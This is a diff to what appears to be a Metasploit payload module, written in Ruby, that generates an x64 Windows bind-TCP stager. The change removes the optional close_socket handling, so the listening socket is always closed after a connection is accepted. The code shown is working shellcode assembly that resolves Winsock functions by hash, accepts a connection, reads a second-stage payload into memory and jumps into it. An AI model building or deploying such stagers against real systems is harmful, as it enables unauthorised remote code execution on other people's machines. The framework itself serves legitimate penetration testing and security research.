@@ -28,17 +28,15 @@ module Payload::Windows::BindTcp_x64
   def generate
     # Generate the simple version of this stager if we don't have enough space
     if self.available_space.nil? || required_space > self.available_space
-      return generate_bind_tcp(
-        port:         datastore['LPORT'],
-        close_socket: close_listen_socket
-      )
+      return generate_bind_tcp({
+        :port => datastore['LPORT']
+      })
     end
 
     conf = {
-      port:         datastore['LPORT'],
-      exitfunk:     datastore['EXITFUNC'],
-      close_socket: close_listen_socket,
-      reliable:     true
+      :port     => datastore['LPORT'],
+      :exitfunk => datastore['EXITFUNC'],
+      :reliable => true
     }
 
     generate_bind_tcp(conf)
@@ -104,7 +102,6 @@ module Payload::Windows::BindTcp_x64
   #
   def asm_bind_tcp(opts={})
     reliable     = opts[:reliable]
-    close_socket = opts[:close_socket]
     encoded_port = "0x%.16x" % [opts[:port].to_i,2].pack("vn").unpack("N").first
 
     asm = %Q^
@@ -160,24 +157,11 @@ module Payload::Windows::BindTcp_x64
         mov rcx, rdi           ; listening socket
         mov r10d, 0xE13BEC74   ; hash( "ws2_32.dll", "accept" )
         call rbp               ; accept( s, 0, 0 );
-      ^
-
-    if close_socket
-      asm << %Q^
         ; perform the call to closesocket...
         mov rcx, rdi           ; the listening socket to close
         mov rdi, rax           ; swap the new connected socket over the listening socket
         mov r10d, 0x614D6E75   ; hash( "ws2_32.dll", "closesocket" )
         call rbp               ; closesocket( s );
-      ^
-    else
-      asm << %Q^
-        mov r14, rdi           ; stash the listen socket for later.
-        mov rdi, rax           ; swap the new connected socket over the listening socket
-      ^
-    end
-
-    asm << %Q^
         ; restore RSP so we dont have any alignment issues with the next block...
         add rsp, #{408+8+8*4+32*7} ; cleanup the stack allocations
 
@@ -216,15 +200,6 @@ module Payload::Windows::BindTcp_x64
         sub rsi, rax           ; length -= bytes_received
         test rsi, rsi          ; test length
         jnz read_more          ; continue if we have more to read
-    ^
-
-    unless close_socket
-      asm << %Q^
-        mov rsi, r14           ; restore the listen socket
-      ^
-    end
-
-    asm << %Q^
         jmp r15                ; return into the second stage
     ^
 
